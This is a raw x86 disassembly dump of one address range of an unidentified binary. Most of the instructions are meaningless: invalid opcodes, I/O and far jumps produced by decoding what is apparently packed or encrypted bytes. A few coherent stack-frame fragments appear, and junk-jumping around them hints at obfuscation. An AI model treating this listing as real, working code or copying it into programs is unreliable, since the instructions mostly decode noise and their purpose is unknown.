  411c16:	pop    esi
  411c17:	stc    
  411c18:	add    eax,ebx
  411c1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c1b:	mov    dh,0xe2
  411c1d:	xchg   ecx,eax
  411c1e:	inc    ecx
  411c1f:	js     0x411be7
  411c21:	cmp    al,0x65
  411c23:	push   0xffffffae
  411c25:	outs   dx,BYTE PTR ds:[esi]
  411c26:	out    0x3,al
  411c28:	mov    dh,bl
  411c2a:	xchg   ah,al
  411c2c:	loopne 0x411bb7
  411c2e:	and    eax,DWORD PTR [eax+ebx*1]
  411c31:	and    ah,dl
  411c33:	aas    
  411c34:	fs popa 
  411c36:	add    ah,BYTE PTR [ecx-0x6d]
  411c39:	jecxz  0x411c52
  411c3b:	rcl    BYTE PTR [edx-0x4157dc3a],cl
  411c41:	sub    DWORD PTR [esi],eax
  411c43:	adc    eax,0x2cecbc13
  411c48:	mov    ch,0xe6
  411c4a:	adc    bh,BYTE PTR [ebx+0x54522fc8]
  411c50:	pushf  
  411c51:	add    BYTE PTR ds:[edi],0xda
  411c55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c56:	fwait
  411c57:	ret    
  411c58:	sbb    ebx,DWORD PTR [ecx]
  411c5a:	or     al,ah
  411c5c:	jbe    0x411c24
  411c5e:	call   0xd5b0:0x79e16eec
  411c65:	out    dx,al
  411c66:	aaa    
  411c67:	call   0xd57171e0
  411c6c:	push   ebx
  411c6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c6e:	cmp    al,BYTE PTR ds:0x4e7456a5
  411c74:	mov    ecx,ecx
  411c76:	pusha  
  411c77:	rcl    DWORD PTR [edi],1
  411c79:	mov    bl,0xe
  411c7b:	jl     0x411c05
  411c7d:	jnp    0x411c39
  411c7f:	js     0x411cf7
  411c81:	(bad)  
  411c83:	lds    edx,FWORD PTR [eax-0x420474a2]
  411c89:	pop    eax
  411c8a:	cdq    
  411c8b:	into   
  411c8c:	pop    ss
  411c8d:	addr16 jg 0x411cf8
  411c90:	cmp    al,0x49
  411c92:	and    eax,0xb9f9ebe7
  411c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c98:	dec    edx
  411c99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c9a:	cli    
  411c9b:	xchg   ebp,eax
  411c9c:	and    al,0xdf
  411c9e:	and    al,0x68
  411ca0:	mov    bh,BYTE PTR [esi+edx*1]
  411ca3:	inc    edi
  411ca4:	or     al,dl
  411ca6:	fld    TBYTE PTR [ebx+0x5a70acaf]
  411cac:	pop    eax
  411cad:	rcl    DWORD PTR [edx+esi*4-0x63292785],1
  411cb4:	mov    ebp,DWORD PTR [edi+0x75]
  411cb7:	or     al,0x9b
  411cb9:	mov    esp,0x97903f53
  411cbe:	xchg   BYTE PTR [edx],ch
  411cc0:	mov    bl,0x8e
  411cc2:	add    al,0x29
  411cc4:	shr    DWORD PTR [esi+0x7a9a2b90],cl
  411cca:	js     0x411c5c
  411ccc:	dec    eax
  411ccd:	pop    es
  411cce:	xor    ecx,DWORD PTR [esi]
  411cd0:	and    bh,BYTE PTR [ecx]
  411cd2:	icebp  
  411cd3:	mov    bl,0x2f
  411cd5:	fnstenv [edi+0x21]
  411cd8:	mov    edi,DWORD PTR [ebp-0x8]
  411cdb:	mov    ebx,DWORD PTR [ebp-0x10]
  411cde:	sub    ebx,edi
  411ce0:	cmp    ebx,edx
  411ce2:	mov    edx,DWORD PTR [ebp-0x38]
  411ce5:	jbe    0x411f76
  411ceb:	jmp    0x411f73
  411cf0:	rol    al,1
  411cf2:	(bad)  
  411cf3:	ds (bad) 
  411cf5:	into   
  411cf6:	rcl    dh,1
  411cf8:	adc    eax,0xb666579e
  411cfd:	inc    ebx
  411cfe:	push   ss
  411cff:	in     eax,dx
  411d00:	jle    0x411d67
  411d02:	js     0x411d7c
  411d04:	in     eax,0x7e
  411d06:	js     0x411d80
  411d08:	or     esi,DWORD PTR [ecx*4-0x48bd9181]
  411d0f:	sbb    ebx,DWORD PTR [esi+0x4]
  411d12:	lock mov edi,edx
  411d15:	xchg   BYTE PTR [ebx-0x7a9fb628],al
  411d1b:	pop    es
  411d1c:	shl    BYTE PTR [ecx+0x33],1
  411d1f:	pop    eax
  411d20:	lods   eax,DWORD PTR ds:[esi]
  411d21:	cmp    edi,DWORD PTR [ebp+0x5e7bbe9a]
  411d27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d28:	int3   
  411d29:	mov    bl,0x1d
  411d2b:	or     ebx,DWORD PTR [esi]
  411d2d:	(bad)  [eax+0x5024773c]
  411d33:	fs dec ebp
  411d35:	mov    eax,0xfa143d07
  411d3a:	inc    ecx
  411d3b:	push   edx
  411d3c:	call   0xe5f69b59
  411d41:	sbb    BYTE PTR [eax],0x8c
  411d44:	pop    ebx
  411d45:	push   ds
  411d46:	aam    0x52
  411d48:	dec    ebp
  411d49:	jae    0x411d1d
  411d4b:	ins    DWORD PTR es:[edi],dx
  411d4c:	retf   0x6a1
  411d4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d50:	add    DWORD PTR [edx+edx*1],eax
  411d53:	jo     0x411d50
  411d55:	adc    bl,BYTE PTR [ecx]
  411d57:	sbb    edx,DWORD PTR [esi]
  411d59:	or     eax,0xf904e120
  411d5e:	test   BYTE PTR [edi+0x62],bh
  411d61:	enter  0x8316,0x12
  411d65:	stc    
  411d66:	ins    BYTE PTR es:[edi],dx
  411d67:	not    BYTE PTR [ebx]
  411d69:	and    DWORD PTR [esi+0x2e],0x5c408e06
  411d70:	retfw  0x437f
  411d74:	hlt    
  411d75:	push   ecx
  411d76:	je     0x411d9f
  411d78:	hlt    
  411d79:	dec    esp
  411d7a:	stc    
  411d7b:	sbb    al,0xf4
  411d7d:	xor    bl,bl
  411d7f:	fwait
  411d80:	cld    
  411d81:	je     0x411dde
  411d83:	xor    esp,DWORD PTR [ecx+0x13]
  411d86:	imul   edx,ecx,0x9
  411d89:	mov    gs,WORD PTR gs:0x8700f4d2
  411d90:	js     0x411e05
  411d92:	push   ebx
  411d93:	mov    ds:0x1313c7c0,al
  411d98:	xor    cl,dl
  411d9a:	adc    DWORD PTR ds:0x89071f6e,esi
  411da0:	adc    al,0x72
  411da2:	scas   eax,DWORD PTR es:[edi]
  411da3:	stos   BYTE PTR es:[edi],al
  411da4:	das    
  411da5:	gs mov bh,0x7d
  411da8:	sbb    DWORD PTR [eax+0x6c],edi
  411dab:	dec    esp
  411dac:	ror    DWORD PTR [eax+0x672161ef],cl
  411db2:	das    
  411db3:	mov    ds:0x471217eb,eax
  411db8:	mov    ch,BYTE PTR [ebx]
  411dba:	loope  0x411e18
  411dbc:	mov    ch,BYTE PTR [eax-0x5d]
  411dbf:	mov    eax,DWORD PTR [esi+0x10]
  411dc2:	loop   0x411dfc
  411dc4:	cli    
  411dc5:	jmp    0x20fda85f
  411dca:	jmp    0x411ded
  411dcc:	mov    cl,0x22
  411dce:	pop    esp
  411dcf:	in     eax,dx
  411dd0:	popf   
  411dd1:	(bad)  
  411dd2:	cmp    al,0x74
  411dd4:	pop    esp
  411dd5:	inc    ecx
  411dd6:	sub    eax,0xf600ae60
  411ddb:	adc    eax,0x3373cc40
  411de0:	lahf   
  411de1:	jmp    0x88d9b164
  411de6:	fcmovu st,st(2)
  411de8:	add    BYTE PTR [edx],bl
  411dea:	stos   BYTE PTR es:[edi],al
  411deb:	xor    bh,dl
  411ded:	arpl   WORD PTR [esi+ebx*2],bx
  411df0:	ficom  DWORD PTR [edx]
  411df2:	in     eax,dx
  411df3:	lods   al,BYTE PTR ds:[esi]
  411df4:	push   ebx
  411df5:	in     eax,0xaf
  411df7:	or     bh,dh
  411df9:	push   ecx
  411dfa:	int    0x31
  411dfc:	cmc    
  411dfd:	push   0x3d
  411dff:	aad    0x73
  411e01:	loop   0x411df8
  411e03:	cs pop esp
  411e05:	dec    ebp
  411e06:	aaa    
  411e07:	outs   dx,DWORD PTR ds:[esi]
  411e08:	scas   al,BYTE PTR es:[edi]
  411e09:	mov    WORD PTR [eax],ss
  411e0b:	and    ch,BYTE PTR [ecx+0x7c]
  411e0e:	dec    eax
  411e0f:	scas   al,BYTE PTR es:[edi]
  411e10:	aaa    
  411e11:	out    0x52,al
  411e13:	imul   edi,DWORD PTR [esi-0x38e7f600],0x8f376cf9
  411e1d:	lock popa 
  411e1f:	xor    BYTE PTR [ecx-0x5e3b432a],0x78
  411e26:	jae    0x411e06
  411e28:	inc    ecx
  411e29:	dec    esi
  411e2a:	neg    DWORD PTR [eax]
  411e2c:	and    esp,eax
  411e2e:	jnp    0x411dbd
  411e30:	add    DWORD PTR [ebp-0x1133718f],eax
  411e36:	mov    cl,0x40
  411e38:	push   ecx
  411e39:	inc    ebp
  411e3a:	cli    
  411e3b:	dec    edi
  411e3c:	das    
  411e3d:	fiadd  WORD PTR [eax]
  411e3f:	inc    esi
  411e40:	cmp    ebp,DWORD PTR [ebx+0x3102002b]
  411e46:	lods   al,BYTE PTR ds:[esi]
  411e47:	push   esi
  411e48:	shl    cl,1
  411e4a:	or     al,0x18
  411e4c:	lods   eax,DWORD PTR ds:[esi]
  411e4d:	sahf   
  411e4e:	mov    edi,0x6475e84e
  411e53:	jmp    0x5d6fe37d
  411e58:	push   esi
  411e59:	test   BYTE PTR [esi],dl
  411e5b:	adc    edx,DWORD PTR [edx]
  411e5d:	addr16 pop esi
  411e5f:	pop    ss
  411e60:	inc    ebp
  411e61:	cmp    DWORD PTR [esi],esp
  411e63:	scas   al,BYTE PTR es:[edi]
  411e64:	popf   
  411e65:	fs inc edx
  411e67:	loop   0x411e73
  411e69:	rol    BYTE PTR [edi],cl
  411e6b:	push   edi
  411e6c:	cmp    dh,ah
  411e6e:	push   eax
  411e6f:	cld    
  411e70:	sbb    bl,BYTE PTR [ebx]
  411e72:	repz repz ja 0x411e9d
  411e76:	mov    ds:0x5b98e164,al
  411e7b:	or     ch,BYTE PTR [ecx-0x4e]
  411e7e:	ins    DWORD PTR es:[edi],dx
  411e7f:	pop    es
  411e80:	repnz cmp al,0x30
  411e83:	xchg   ecx,eax
  411e84:	out    0x20,al
  411e86:	sub    edx,ebx
  411e88:	(bad)  
  411e89:	(bad)  
  411e8a:	mov    ebx,DWORD PTR [ebx+0x786d1db]
  411e90:	xlat   BYTE PTR ds:[ebx]
  411e91:	sbb    DWORD PTR [esi-0x1f951f44],ebx
  411e97:	or     al,0xc8
  411e99:	icebp  
  411e9a:	(bad)  
  411e9b:	cld    
  411e9c:	retf   0x1e5c
  411e9f:	mov    edi,DWORD PTR [ecx-0x79]
  411ea2:	sub    al,BYTE PTR [esi-0x342e1d5b]
  411ea8:	(bad)  
  411eaa:	mov    ebx,DWORD PTR [ebx-0xc]
  411ead:	inc    esp
  411eae:	xlat   BYTE PTR ds:[ebx]
  411eaf:	ja     0x411e4b
  411eb1:	ss push 0xcad5a53
  411eb7:	loope  0x411e77
  411eb9:	add    BYTE PTR [ecx],bh
  411ebb:	rcr    ebp,0x12
  411ebe:	adc    ebp,edx
  411ec0:	(bad)  
  411ec1:	fisubr DWORD PTR [ebx+0x17597fa]
  411ec7:	addr16 retf 
  411ec9:	add    DWORD PTR ds:0xa2800b4d,ecx
  411ecf:	out    0xe4,eax
  411ed1:	cmp    DWORD PTR [edx+0x63],esp
  411ed4:	sti    
  411ed5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ed6:	popa   
  411ed7:	cwde   
  411ed8:	ja     0x411f4d
  411eda:	ret    0x4336
  411edd:	fbld   TBYTE PTR [eax-0x4]
  411ee0:	and    bh,bh
  411ee2:	fsubr  DWORD PTR [edx-0x56d562f6]
  411ee8:	adc    BYTE PTR [esp+ebp*2-0x25],bl
  411eec:	jmp    0xdc4a:0x2dec660b
  411ef3:	mov    ebp,0xc74f13cc
  411ef8:	lds    edi,FWORD PTR [edi]
  411efa:	dec    esi
  411efb:	pusha  
  411efc:	fcomip st,st(3)
  411efe:	push   esi
  411eff:	test   BYTE PTR [ecx+0xedc8620],ch
  411f05:	stos   BYTE PTR es:[edi],al
  411f06:	push   0xffffffdc
  411f08:	sbb    eax,0x4de12e62
  411f0d:	dec    esp
  411f0e:	inc    esi
  411f0f:	in     al,0x1a
  411f11:	cdq    
  411f12:	(bad)  
  411f13:	xchg   ecx,eax
  411f14:	xor    ecx,DWORD PTR [ebp-0x65]
  411f17:	call   0x8d38cd
  411f1c:	cdq    
  411f1d:	loop   0x411eb1
  411f1f:	repz out dx,eax
  411f21:	push   ss
  411f22:	call   0x8920:0xbe420e2
  411f29:	clc    
  411f2a:	int3   
  411f2b:	adc    eax,DWORD PTR gs:[eax]
  411f2e:	adc    DWORD PTR [edi],0xb79f5c13
  411f34:	scas   eax,DWORD PTR es:[edi]
  411f35:	or     edx,esi
  411f37:	(bad)  
  411f39:	sbb    al,0xb6
  411f3b:	into   
  411f3c:	and    bl,BYTE PTR [edx]
  411f3e:	out    dx,eax
  411f3f:	hlt    
  411f40:	in     al,dx
  411f41:	je     0x411fbb
  411f43:	or     DWORD PTR [esi+0x2e],esp
  411f46:	or     ah,BYTE PTR [ebp+0x47]
  411f49:	sti    
  411f4a:	loope  0x411f13
  411f4c:	xor    al,0xdc
  411f4e:	cmp    DWORD PTR [ecx],ebp
  411f50:	in     al,dx
  411f51:	pop    esp
  411f52:	mov    dl,ah
  411f54:	pop    edx
  411f55:	je     0x411f70
  411f57:	sub    DWORD PTR [ebx+0x49],edi
  411f5a:	adc    esp,eax
  411f5c:	adc    al,0x4
  411f5e:	pop    edx
  411f5f:	or     esp,DWORD PTR [esi]
  411f61:	test   al,0xe7
  411f63:	cdq    
  411f64:	push   ebp
  411f65:	push   0x31
  411f67:	cmp    eax,0x1ccd58e6
  411f6c:	int    0x15
  411f6e:	ror    BYTE PTR [eax+0x77],0x60
  411f72:	xor    BYTE PTR [ebx+0x7d8bc455],cl
  411f78:	cld    
  411f79:	xor    edi,eax
  411f7b:	xor    edx,eax
  411f7d:	jmp    0x412205
  411f82:	rol    dl,1
  411f84:	enter  0xdac3,0xd1
  411f88:	fcmovnu st,st(1)
  411f8a:	xchg   ebp,eax
  411f8b:	add    al,0x8c
  411f8d:	inc    edi
  411f8e:	sbb    DWORD PTR [ecx+0x6beb59f0],edx
  411f94:	js     0x41200e
  411f96:	in     eax,0x7e
  411f98:	js     0x412012
  411f9a:	vsubsd xmm1,xmm1,QWORD PTR [ebx]
  411f9e:	ror    BYTE PTR [esi+edx*1+0x3a322f6a],0x58
  411fa6:	pop    edi
  411fa7:	jb     0x411f75
  411fa9:	add    BYTE PTR [ebx-0x1eb9613],ah
  411faf:	xor    DWORD PTR [esi+0x190dea9d],0x60
  411fb6:	js     0x411fb8
  411fb8:	out    dx,al
  411fb9:	pop    es
  411fba:	(bad)  
  411fbb:	sub    dh,BYTE PTR [eax]
  411fbd:	mov    cl,0x3b
  411fbf:	add    bl,BYTE PTR [ebx-0x672873dc]
  411fc5:	pop    ebp
  411fc6:	add    eax,0x77b0d211
  411fcb:	mov    esp,0x3b5a473a
  411fd0:	pop    esp
  411fd1:	inc    esi
  411fd2:	push   esi
  411fd3:	rcr    ebp,cl
  411fd5:	fadd   DWORD PTR [ebp-0x4dd25753]
  411fdb:	in     eax,dx
  411fdc:	pop    esp
  411fdd:	scas   al,BYTE PTR es:[edi]
  411fde:	xchg   ecx,eax
  411fdf:	arpl   si,cx
  411fe1:	mov    dl,0x29
  411fe3:	(bad)  
  411fe4:	loope  0x411f88
  411fe6:	mov    ss,WORD PTR [ecx-0x4b]
  411fe9:	aam    0x55
  411feb:	or     DWORD PTR [ecx+0x5d],ebx
  411fee:	xchg   ebp,eax
  411fef:	aas    
  411ff0:	cli    
  411ff1:	sbb    DWORD PTR [ebp-0x3d],esp
  411ff4:	scas   al,BYTE PTR es:[edi]
  411ff5:	shr    DWORD PTR [eax],cl
  411ff7:	cdq    
  411ff8:	cmp    al,dl
  411ffa:	div    ecx
  411ffc:	add    eax,0xd460db71
  412001:	mov    al,ds:0xc64c8cc3
  412006:	je     0x411fc8
  412008:	outs   dx,BYTE PTR ds:[esi]
  412009:	inc    eax
  41200a:	push   ecx
  41200b:	sub    ah,BYTE PTR [edi+eax*8]
  41200e:	push   edx
  41200f:	std    
  412010:	xchg   BYTE PTR [edi-0x2b],dh
  412013:	mov    bh,0xa9
  412015:	hlt    
  412016:	fist   DWORD PTR [edx-0x6c]
  412019:	call   0xae73ae54
  41201e:	popa   
  41201f:	cmp    bh,BYTE PTR [ebp+ecx*1+0x4ebcfc74]
  412026:	stc    
  412027:	dec    esp
  412028:	(bad)  
  412029:	iret   
  41202a:	jmp    0xa906:0xc03cae5d
  412031:	pop    ds
  412032:	pop    eax
  412033:	sbb    DWORD PTR [edx+0x52],edi
  412036:	xor    eax,0x96e5ed98
  41203b:	adc    DWORD PTR [edx],ebx
  41203d:	jle    0x412011
  41203f:	add    dh,dl
  412041:	jmp    0xc04c9573
  412046:	jmp    0x6521:0xa9b705f6
  41204d:	push   edx
  41204e:	and    ebp,0x1a
  412051:	outs   dx,DWORD PTR ds:[esi]
  412052:	mov    ecx,0xcad0542
  412057:	jle    0x412097
  412059:	sbb    DWORD PTR [edx],0xfffffff5
  41205c:	sub    al,0x3f
  41205e:	repnz mov BYTE PTR gs:[ebx+0x39],dl
  412063:	(bad)  
  412064:	retf   0x955b
  412067:	jg     0x41200d
  412069:	adc    esi,ebp
  41206b:	sahf   
  41206c:	data16 adc dh,BYTE PTR [edi]
  41206f:	xchg   ebx,eax
  412070:	push   ebp
  412071:	stos   BYTE PTR es:[edi],al
  412072:	sub    ebp,esi
  412074:	mov    WORD PTR [ecx+eax*2-0x38fdb841],gs
  41207b:	nop
  41207c:	popa   
  41207d:	mov    di,0x1a67
  412081:	xor    al,0x3a
  412083:	push   esi
  412084:	cs stos BYTE PTR es:[edi],al
  412086:	ss fwait
  412088:	xchg   edi,eax
  412089:	loope  0x412014
  41208b:	mov    esp,0xb2a8e4e5
  412090:	mov    ebx,0xaf82d7a7
  412095:	repnz mov ch,0xba
  412098:	les    ebx,FWORD PTR [eax+0x367c4d88]
  41209e:	das    
  41209f:	repz fnstsw WORD PTR [ebx]
  4120a2:	leave  
  4120a3:	sub    al,0xca
  4120a5:	je     0x41209d
  4120a7:	das    
  4120a8:	xor    DWORD PTR ds:0x8bf2b8ff,esp
  4120ae:	xor    BYTE PTR [edx+0x68],dh
  4120b1:	or     al,0x61
  4120b3:	ins    BYTE PTR es:[edi],dx
  4120b4:	out    0x28,eax
  4120b6:	fsub   QWORD PTR [ebx-0x577d0757]
  4120bc:	imul   edi,DWORD PTR [edx+0x50949519],0xfffffff6
  4120c3:	sub    al,BYTE PTR [ecx]
  4120c5:	in     al,0x71
  4120c7:	xlat   BYTE PTR ds:[ebx]
  4120c8:	inc    bp
  4120ca:	ins    DWORD PTR es:[edi],dx
  4120cb:	pop    ecx
  4120cc:	shl    BYTE PTR ds:0x53f40218,0x53
  4120d3:	jns    0x41207d
  4120d5:	imul   esi,DWORD PTR [ebx+0xc],0xffffffb4
  4120d9:	xchg   ebx,eax
  4120da:	xchg   edx,eax
  4120db:	bswap  ebx
  4120dd:	push   0x16
  4120df:	retf   
  4120e0:	pop    ecx
  4120e1:	xor    BYTE PTR [ecx-0x5b],0x20
  4120e5:	test   DWORD PTR [esi+0x70],ebx
  4120e8:	cmp    BYTE PTR [ebx+0x76fcffa],ch
  4120ee:	aam    0x8f
  4120f0:	in     al,0x74
  4120f2:	jmp    esp
  4120f4:	retf   
  4120f5:	pop    ebp
  4120f6:	jg     0x412165
  4120f8:	pop    esp
  4120f9:	mov    al,ah
  4120fb:	cli    
  4120fc:	and    eax,0x472fb248
  412102:	pop    ecx
  412103:	jo     0x41214d
  412105:	stc    
  412106:	sti    
  412107:	clc    
  412108:	aam    0xa3
  41210a:	xor    al,0x4b
  41210c:	cmp    DWORD PTR [edi],0xe108f6
  412112:	jle    0x4120f4
  412114:	les    edi,FWORD PTR [edx]
  412116:	mov    WORD PTR [ecx+esi*4+0x77],es
  41211a:	push   ds
  41211b:	int    0xe
  41211d:	jmp    DWORD PTR [esi-0x3b]
  412120:	pop    edx
  412121:	popa   
  412122:	aad    0x33
  412124:	xor    esp,esi
  412126:	les    esi,FWORD PTR [edi+0x19ef881e]
  41212c:	cmp    BYTE PTR [eax],0x91
  41212f:	imul   edi,DWORD PTR [esi+0x542a7bc8],0xdea2db97
  412139:	mov    edi,0x16e3e943
  41213e:	fldcw  WORD PTR [edi+0x4f]
  412141:	fdivp  st(5),st
  412143:	sub    bl,BYTE PTR ds:0x4a9143c0
  412149:	cmp    eax,0xeb7c656d
  41214e:	pop    esp
  41214f:	push   edx
  412150:	imul   ecx,DWORD PTR [edx+0x6961b147],0xffffff89
  412157:	in     eax,0xd6
  412159:	jbe    0x412166
  41215b:	dec    eax
  41215c:	jns    0x412188
  41215e:	push   ds
  41215f:	repz lock push cs
  412162:	xor    esp,ecx
  412164:	ret    
  412165:	cmp    cl,BYTE PTR ds:[ebp+0x3edd37d3]
  41216c:	clc    
  41216d:	pop    ds
  41216e:	mov    eax,0x470dde26
  412173:	aas    
  412174:	js     0x4121b3
  412176:	mov    WORD PTR [ebx-0x35cc06f],es
  41217c:	pop    ss
  41217d:	mov    ah,0x80
  41217f:	ror    DWORD PTR [edi],1
  412181:	xlat   BYTE PTR ds:[ebx]
  412182:	push   ss
  412183:	add    DWORD PTR ds:0xb32abba5,0xd4cc4f47
  41218d:	sbb    cl,BYTE PTR [ecx]
  41218f:	addr16 out dx,al
  412191:	sbb    BYTE PTR [esp+ebx*2-0x6a6cbf3e],0xf0
  412199:	(bad)  
  41219a:	ins    DWORD PTR es:[edi],dx
  41219b:	adc    bl,BYTE PTR [ebx-0x27eb2d32]
  4121a1:	fidivr WORD PTR [eax]
  4121a3:	pop    ebx
  4121a4:	mov    bl,0x7d
  4121a6:	sbb    ah,BYTE PTR [edx-0x4e]
  4121a9:	sti    
  4121aa:	mov    ecx,0x7a52dbca
  4121af:	mov    ds:0x20a65526,al
  4121b4:	outs   dx,DWORD PTR ds:[esi]
  4121b5:	leave  
  4121b6:	ficom  DWORD PTR [edx-0x7c26ecc7]
  4121bc:	and    DWORD PTR [ebp-0x3a032933],esi
  4121c2:	mov    al,0x57
  4121c4:	push   ds
  4121c5:	into   
  4121c6:	jo     0x4121fd
  4121c8:	add    BYTE PTR [eax-0x67c319ee],bl
  4121ce:	or     bh,BYTE PTR [ebx-0x3978154a]
  4121d4:	lock lds ecx,FWORD PTR [ecx+eiz*1]
  4121d8:	push   0x11
  4121da:	fs loope 0x4121f9
  4121dd:	inc    ebx
  4121de:	gs mov dl,0x5
  4121e1:	ja     0x4121d9
  4121e3:	xchg   esp,eax
  4121e4:	into   
  4121e5:	call   0xce66:0xc714a4b1
  4121ec:	inc    BYTE PTR [esi-0x458d3a7]
  4121f2:	adc    eax,0x46db43b
  4121f7:	pop    ebp
  4121f8:	hlt    
  4121f9:	fist   WORD PTR [edi+0xa4874a5]
  4121ff:	mov    cl,0xd3
  412201:	pop    ss
  412202:	xor    al,0x8f
  412204:	gs add edi,ecx
  412207:	add    edx,ecx
  412209:	imul   edx,edi
  41220c:	mov    DWORD PTR [ebp+0xc],edx
  41220f:	mov    edx,DWORD PTR [ebp+0xc]
  412212:	mov    DWORD PTR [ebp-0x24],edx
  412215:	mov    edx,DWORD PTR [ebp-0x8]
  412218:	add    edx,DWORD PTR [ebp-0x40]
  41221b:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  412222:	jmp    0x4124aa
  412227:	(bad)
  41222b:	(bad)  
  41222c:	fcmovnu st,st(1)
  41222e:	shr    esp,1
  412230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412231:	xchg   edx,eax
  412232:	(bad)  
  412233:	jns    0x41229e
  412235:	add    esi,DWORD PTR [eax]
  412237:	push   eax
  412238:	imul   edi,DWORD PTR [eax+0x78],0x78787ee5
  41223f:	jmp    0x3869:0xc6f18800
  412246:	push   ecx
  412247:	dec    eax
  412248:	push   ds
  412249:	mov    ss,WORD PTR [edi]
  41224b:	pushf  
  41224c:	push   DWORD PTR [eax]
  41224e:	cwde   
  41224f:	loopne 0x412214
  412251:	jo     0x4121e5
  412253:	pop    ebp
  412254:	push   DWORD PTR [edx]
  412256:	push   esi
  412257:	or     ebp,DWORD PTR [edi+0x3dfe97a1]
  41225d:	mov    ch,0x20
  41225f:	lock adc eax,0x9b1e63fe
  412265:	mov    ds:0xd8e8f5af,eax
  41226a:	retf   
  41226b:	jns    0x4122a5
  41226d:	jmp    0x41221e
  41226f:	(bad)  
  412270:	push   edx
  412271:	iret   
  412272:	mov    ebp,0x1dd3dfe8
  412277:	call   0xc123:0x95f94b9b
  41227e:	xchg   ebp,eax
  41227f:	push   eax
  412280:	mov    ds:0x24780d19,eax
  412285:	jmp    0x4122c9
  412287:	cmp    al,0x97
  412289:	xor    eax,0x8a0d15f5
  41228e:	sbb    BYTE PTR [esi-0x34db8578],bl
  412294:	add    DWORD PTR [ebx-0x733ef7f2],ebx
  41229a:	xchg   esi,esp
  41229c:	inc    esp
  41229d:	pop    ds
  41229e:	dec    ecx
  41229f:	out    dx,eax
  4122a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122a1:	bound  esp,QWORD PTR [edx+0x22054de5]
  4122a7:	sbb    BYTE PTR [eiz*8-0x3abd8d07],0x59
  4122af:	arpl   WORD PTR [edx+0x5b],dx
  4122b2:	jmp    0xf044:0x1ebd63
  4122b9:	xor    BYTE PTR [edx+0x71],dl
  4122bc:	bound  ebx,QWORD PTR [edx-0x4cc6e845]
  4122c2:	sub    esp,DWORD PTR [edi]
  4122c4:	xchg   BYTE PTR [ecx+eax*1-0x62],al
  4122c8:	push   ss
  4122c9:	fild   DWORD PTR [ecx+0x3caa4d05]
  4122cf:	inc    ebp
  4122d0:	fisubr DWORD PTR [edx+0x581adf16]
  4122d6:	pop    ss
  4122d7:	(bad)  
  4122d8:	dec    esi
  4122d9:	push   edi
  4122da:	push   ecx
  4122db:	fst    DWORD PTR [ebp+0x34]
  4122de:	jmp    0xa260:0x55cdde27
  4122e5:	adc    BYTE PTR [ecx+0x23],0x28
  4122e9:	jmp    0xb6a0:0x394e2f46
  4122f0:	(bad)  
  4122f1:	popf   
  4122f2:	sti    
  4122f3:	into   
  4122f4:	sbb    bl,BYTE PTR [eax+0x7d346f31]
  4122fa:	dec    edi
  4122fb:	cmp    BYTE PTR [ebp*2-0x726c2784],cl
  412302:	repnz mov ch,0xf2
  412305:	and    BYTE PTR [eax],bl
  412307:	push   ebp
  412308:	test   DWORD PTR [edx],esp
  41230a:	jecxz  0x4122d6
  41230c:	mov    ch,0xbc
  41230e:	sub    dl,cl
  412310:	xchg   ebp,eax
  412311:	adc    edx,edi
  412313:	popf   
  412314:	imul   edx,esi,0x23
  412317:	rcl    DWORD PTR [ecx+0x7f],0xed
  41231b:	push   eax
  41231c:	je     0x4122f6
  41231e:	ins    BYTE PTR es:[edi],dx
  41231f:	xor    dh,BYTE PTR [eax-0x737fa34c]
  412325:	sti    
  412326:	test   DWORD PTR [esi+edi*2],ebp
  412329:	shl    BYTE PTR [ebx+0x1ba1a01a],1
  41232f:	inc    edi
  412330:	adc    dh,dl
  412332:	jnp    0x41239f
  412334:	ret    0xb326
  412337:	stos   DWORD PTR es:[edi],eax
  412338:	mov    ebx,0x6f2b987
  41233d:	aaa    
  41233e:	xchg   ebp,eax
  41233f:	or     ecx,DWORD PTR [edi]
  412341:	call   0xf6da6815
  412346:	xor    BYTE PTR [esi],dh
  412348:	xchg   edx,eax
  412349:	stos   DWORD PTR es:[edi],eax
  41234a:	pop    ecx
  41234b:	in     al,0xc7
  41234d:	lds    eax,FWORD PTR [edi+0x45]
  412350:	xor    BYTE PTR [esi-0x5d],bl
  412353:	ss jns 0x4122f7
  412356:	dec    esp
  412357:	gs push esp
  412359:	xchg   edx,eax
  41235a:	xor    eax,0x55f782a2
  41235f:	call   0xf190:0x5becb9c
  412366:	pop    esi
  412367:	mul    ebx
  412369:	in     eax,0xbe
  41236b:	jno    0x4123bd
  41236d:	push   edx
  41236e:	add    DWORD PTR [ebx],ebx
  412370:	mul    eax
  412372:	jbe    0x41231c
  412374:	mov    al,0xce
  412376:	das    
  412377:	push   es
  412378:	sar    BYTE PTR [eax+0x2610cfa4],1
  41237e:	in     al,dx
  41237f:	fimul  DWORD PTR es:[ecx+0x17]
  412383:	mov    es,WORD PTR [esi-0x48]
  412386:	adc    eax,0x68886f10
  41238b:	mov    dh,0x51
  41238d:	aaa    
  41238e:	xor    BYTE PTR [esi],dh
  412390:	inc    edi
  412391:	or     bl,BYTE PTR [ebx-0x30132e6c]
  412397:	push   ebp
  412398:	pop    edi
  412399:	out    0xb0,al
  41239b:	xchg   BYTE PTR [edx+0x4d],ah
  41239e:	mov    ah,0xca
  4123a0:	test   esp,esi
  4123a2:	mov    bh,BYTE PTR [ecx+edx*8]
  4123a5:	jb     0x4123d6
  4123a7:	paddusw mm2,mm2
  4123aa:	mov    ebx,0xe977fc1c
  4123af:	imul   edi,DWORD PTR [eax-0x2bca09a3],0x31505b72
  4123b9:	shr    DWORD PTR [esi-0x6e6332bd],cl
  4123bf:	mov    edi,0x20052a61
  4123c4:	jbe    0x4123f6
  4123c6:	outs   dx,BYTE PTR ds:[esi]
  4123c7:	js     0x4123b5
  4123c9:	mov    edx,0x95aef2e4
  4123ce:	rcr    DWORD PTR [edx+edx*2],0xe0
  4123d2:	add    bh,BYTE PTR [ebp-0x29fbb63e]
  4123d8:	stc    
